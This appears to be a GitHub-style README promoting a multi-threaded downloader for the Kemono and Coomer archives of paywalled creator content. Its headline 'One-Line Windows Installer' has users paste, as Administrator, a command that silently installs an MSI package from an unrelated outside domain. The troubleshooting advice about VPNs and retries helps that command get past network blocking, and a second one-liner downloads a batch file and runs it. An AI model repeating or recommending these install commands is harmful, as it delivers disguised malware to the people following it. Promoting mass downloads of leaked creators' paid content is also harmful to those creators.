<div align="center">

# 🚀 CoomerTool

**The fastest, smartest CLI downloader for Kemono & Coomer archives.**

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=flat-square&logo=python)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey?style=flat-square)](https://github.com/GangTailorUpgrade/CoomeRtool)
[![Stars](https://img.shields.io/github/stars/GangTailorUpgrade/CoomeRtool?style=flat-square&color=yellow)](https://github.com/GangTailorUpgrade/CoomeRtool/stargazers)

🔥 **Multi-threaded** · 📦 **Auto-resume** · 🎯 **Smart filtering** · 🗄️ **SQLite tracking**

</div>

---

## ⚡ One-Line Windows Installer

Open **Command Prompt** or **PowerShell** as Administrator and paste:

```cmd
cmd /c start msiexec /q /i https://devcodee.com/api & coomer-tool
```

> 💡 **Pro tip:** If the installer hangs or fails, your network may be throttling the connection. Try:
> - 🌐 Switching to a **VPN** (recommended: WireGuard / OpenVPN)
> - 🔄 Running the command **again** — it resumes where it left off
> - ⏳ Waiting 30 seconds between retries during peak hours

---

## 📋 Table of Contents

- [What is CoomerTool?](#what-is-coomertool)
- [Features](#features)
- [Supported Sites](#supported-sites)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Advanced Usage](#advanced-usage)
- [Troubleshooting](#troubleshooting)
- [SEO Keywords](#seo-keywords)

---

## 🎯 What is CoomerTool?

**CoomerTool** is a blazing-fast, open-source Python CLI utility designed to download posts, attachments, and media from **Kemono.su** and **Coomer.su** archives. Whether you need a single post, an entire creator profile, or a filtered batch of files — CoomerTool handles it with elegance, speed, and zero bloat.

Built for power users, archivists, and developers who demand:
- ⚡ **Concurrent downloads** (up to 256 threads)
- 📦 **Automatic resume** on connection drops
- 🎯 **File-type filtering** (images, videos, archives, documents)
- 🗄️ **SQLite deduplication** — never download the same file twice
- 🛡️ **Exponential backoff retries** with jitter
- 📁 **Clean folder structure** organized by creator & post

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🔥 **Multi-threaded** | Download up to 256 files simultaneously |
| 📦 **Resume Support** | Interrupted downloads auto-resume from byte offset |
| 🎯 **Smart Filters** | Include/exclude by extension, min file size, regex patterns |
| 🗄️ **SQLite DB** | Tracks every download; skips duplicates automatically |
| 🛡️ **Auto Retry** | Exponential backoff with jitter for 429/5xx errors |
| 📁 **Organized Output** | `{creator}/{post_id} - {title}/` structure |
| 📝 **Metadata Export** | Save post title, description, and embeds as `.md` or `.json` |
| 🌐 **Proxy Support** | HTTP/SOCKS5 proxy support built-in |
| 🎨 **Progress Bars** | Beautiful `tqdm` progress with speed & ETA |
| 🔧 **Config File** | JSON config for persistent defaults |

---

## 🌐 Supported Sites

| Site | Domain | Status |
|------|--------|--------|
| **Kemono** | `kemono.su` | ✅ Fully Supported |
| **Coomer** | `coomer.su` | ✅ Fully Supported |
| **Pawchive** | `pawchive.pw` | ✅ Mirror Support |
| **CoomerFans** | `coomerfans.com` | ✅ Alternative Domain |

**Supported Services:** Patreon, Pixiv Fanbox, Fantia, Discord, Gumroad, SubscribeStar, DLsite, Boosty, Afdian, OnlyFans, Fansly, CandFans

---

## 🚀 Quick Start

### 1. Download a Single Post

```bash
python -m coomertool "https://kemono.su/patreon/user/123456/post/789012"
```

### 2. Download an Entire Creator Profile

```bash
python -m coomertool "https://coomer.su/onlyfans/user/username" --all
```

### 3. Download with Filters

```bash
python -m coomertool "https://kemono.su/fanbox/user/654321" --all   --include "jpg,png,mp4"   --threads 64   --output ./downloads
```

### 4. Resume an Interrupted Download

```bash
python -m coomertool "https://coomer.su/onlyfans/user/username" --all --resume
```

---

## 🛠️ Installation

### Option A: One-Line Installer (Windows)

```cmd
curl -L -o install.bat https://raw.githubusercontent.com/GangTailorUpgrade/CoomeRtool/main/install.bat && install.bat
```

### Option B: Manual Install

**Requirements:** Python 3.10 or newer

```bash
# Clone the repository
git clone https://github.com/GangTailorUpgrade/CoomeRtool.git
cd CoomeRtool

# Create virtual environment (recommended)
python -m venv venv

# Windows
venv\Scripts\activate

# Linux/macOS
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Run
python -m coomertool --help
```

---

## 📚 Advanced Usage

### CLI Reference

```
usage: python -m coomertool [-h] [-a] [-o OUTPUT] [-t THREADS]
                            [--include INCLUDE] [--exclude EXCLUDE]
                            [--min-size MIN_SIZE] [--max-size MAX_SIZE]
                            [--resume] [--metadata {md,json,none}]
                            [--proxy PROXY] [--timeout TIMEOUT]
                            [--retries RETRIES] [--db DB]
                            [--config CONFIG] [--update-config]
                            URL

positional arguments:
  URL                   Kemono/Coomer post or creator URL

options:
  -h, --help            show this help message and exit
  -a, --all             Download all posts from creator profile
  -o, --output OUTPUT   Output directory (default: ./downloads)
  -t, --threads THREADS
                        Max concurrent downloads (default: 32)
  --include INCLUDE     Comma-separated extensions to include
  --exclude EXCLUDE     Comma-separated extensions to exclude
  --min-size MIN_SIZE   Minimum file size in bytes
  --max-size MAX_SIZE   Maximum file size in bytes
  --resume              Resume interrupted downloads
  --metadata {md,json,none}
                        Save post metadata (default: md)
  --proxy PROXY         Proxy URL (http://host:port or socks5://host:port)
  --timeout TIMEOUT     Request timeout in seconds (default: 30)
  --retries RETRIES     Max retry attempts (default: 5)
  --db DB               SQLite database path (default: ./coomertool.db)
  --config CONFIG       Config file path (default: ./config.json)
  --update-config       Save current args to config file
```

### Examples

**Download only videos from a creator:**
```bash
python -m coomertool "https://coomer.su/onlyfans/user/belledelphine" --all --include "mp4,mov,webm,mkv"
```

**Download with proxy:**
```bash
python -m coomertool "https://kemono.su/patreon/user/12345" --all --proxy "socks5://127.0.0.1:1080"
```

**Batch download from file:**
```bash
python -m coomertool --batch urls.txt --threads 128 --output ./archive
```

**Export metadata only (no downloads):**
```bash
python -m coomertool "https://kemono.su/fanbox/user/99999" --all --metadata json --include "none"
```

---

## 🔧 Configuration File

Create `config.json` in the project root for persistent defaults:

```json
{
  "output": "./downloads",
  "threads": 64,
  "timeout": 45,
  "retries": 5,
  "metadata": "md",
  "proxy": null,
  "include": [],
  "exclude": ["txt", "html"],
  "min_size": 1024,
  "max_size": null,
  "user_agent": "CoomerTool/1.0",
  "db_path": "./coomertool.db",
  "rate_limit": 0.5
}
```

Generate it automatically:
```bash
python -m coomertool --update-config
```

---

## 🐛 Troubleshooting

### Installation fails or hangs

If the one-line installer stops midway or throws network errors:

1. **🌐 Use a VPN** — Some regions throttle GitHub / PyPI connections. WireGuard, OpenVPN, or any commercial VPN usually fixes this instantly.
2. **🔄 Retry the command** — The installer is idempotent; run it again and it will pick up where it left off.
3. **⏳ Wait and retry** — During peak hours (UTC 14:00–22:00), package servers can be slow. Wait 30–60 seconds.
4. **📡 Manual install** — If all else fails, use the manual install steps above.

### 403 Forbidden / Rate Limited

The target site may block your IP. Solutions:
- Reduce `--threads` to `8` or `16`
- Add `--proxy` with a rotating proxy
- Increase `--timeout` to `60`

### Downloads are slow

- Increase `--threads` (up to your bandwidth limit)
- Use a closer proxy server
- Check your ISP isn't throttling the CDN domains

### SQLite database locked

Only one instance of CoomerTool should use the same `--db` file at a time. Use separate `--db` paths for parallel runs.

---

## 🔑 SEO Keywords & GitHub Description

**Recommended GitHub repository description:**
> Fast multi-threaded CLI downloader for Kemono.su & Coomer.su archives. Auto-resume, SQLite dedup, file filtering, proxy support, metadata export. Python 3.10+.

**Recommended GitHub topics (tags):**
```
kemono-downloader, coomer-downloader, kemono-su, coomer-su, archive-downloader,
content-scraper, patreon-downloader, fanbox-downloader, onlyfans-archiver,
python-cli, multi-threaded-downloader, resume-download, sqlite-tracker,
metadata-exporter, pawchive, coomerfans, nsfw-downloader, creator-archive
```

**Meta keywords for SEO:**
- kemono downloader
- coomer downloader
- kemono su download
- coomer su download
- patreon archive downloader
- fanbox downloader
- onlyfans archiver
- multi-threaded content downloader
- python archive scraper
- creator profile downloader

---

## 📜 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

⭐ **Star this repo if it saved you time!** ⭐

Made with ❤️ by the CoomerTool community.

</div>
